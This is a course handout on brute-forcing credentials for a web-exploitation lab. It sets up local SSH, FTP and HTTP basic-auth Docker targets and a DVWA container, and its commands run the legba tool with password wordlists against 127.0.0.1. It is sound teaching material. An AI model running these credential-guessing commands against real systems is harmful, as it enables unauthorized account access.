                          ___________________

                            WEB EXPLOITATION
                           12 - Bruteforcing

                            Leonardo Tamiano
                          ___________________


Table of Contents
_________________

1. Commands
.. 1. SSH
.. 2. FTP
.. 3. HTTP
.. 4. DVWA


1 Commands
==========

  Launch shell with legba
  ,----
  | docker run --entrypoint "/bin/bash" -v $(pwd):/data --network host -it evilsocket/legba:latest 
  `----


1.1 SSH
~~~~~~~

  build docker
  ,----
  | docker build --build-arg password="$(shuf -n 1 ./passwords.txt)" -t legba-lab-ssh .
  `----

  run docker with ssh
  ,----
  | docker run --rm --network host -d -t legba-lab-ssh
  `----

  test login
  ,----
  | ssh -o "UserKnownHostsFile=/dev/null" sshuser@127.0.0.1 
  `----

  run docker with legba
  ,----
  | docker run --entrypoint "/bin/bash" -v $(pwd)/wordlists:/data --network host -it evilsocket/legba:latest
  `----

  legba command
  ,----
  | legba ssh --username sshuser --password /data/passwords.txt --target 127.0.0.1
  `----


1.2 FTP
~~~~~~~

  build docker
  ,----
  | docker build --build-arg password="$(shuf -n 1 ./passwords.txt)" -t legba-lab-ftp .
  `----

  run docker
  ,----
  | docker run --rm --name legba-lab-ftp  --network host -d -t legba-lab-ftp
  `----

  test login
  ,----
  | ftp 127.0.0.1
  | > ftpuser
  | > password
  `----

  run docker with legba
  ,----
  | docker run --entrypoint "/bin/bash" -v $(pwd)/wordlists:/data --network host -it evilsocket/legba:latest
  `----

  legba command
  ,----
  | legba ftp --retry-time 1010 --username ftpuser --password /data/passwords.txt --target 127.0.0.1
  `----


1.3 HTTP
~~~~~~~~

  build docker
  ,----
  | docker build --build-arg password="$(openssl passwd -apr1 $(shuf -n 1 ./passwords.txt))" -t legba-lab-http .
  `----

  run docker
  ,----
  | docker run --rm --name legba-lab-http --network host -t legba-lab-http
  `----

  run docker with legba
  ,----
  | docker run --entrypoint "/bin/bash" -v $(pwd)/wordlists:/data --network host -it evilsocket/legba:latest
  `----

  legba command
  ,----
  | legba http.basic --username httpuser --password wordlists/passwords.txt --target http://127.0.0.1
  `----


1.4 DVWA
~~~~~~~~

  ,----
  | docker run --name dvwa --rm -d -it -p80:80 vulnerables/web-dvwa
  `----
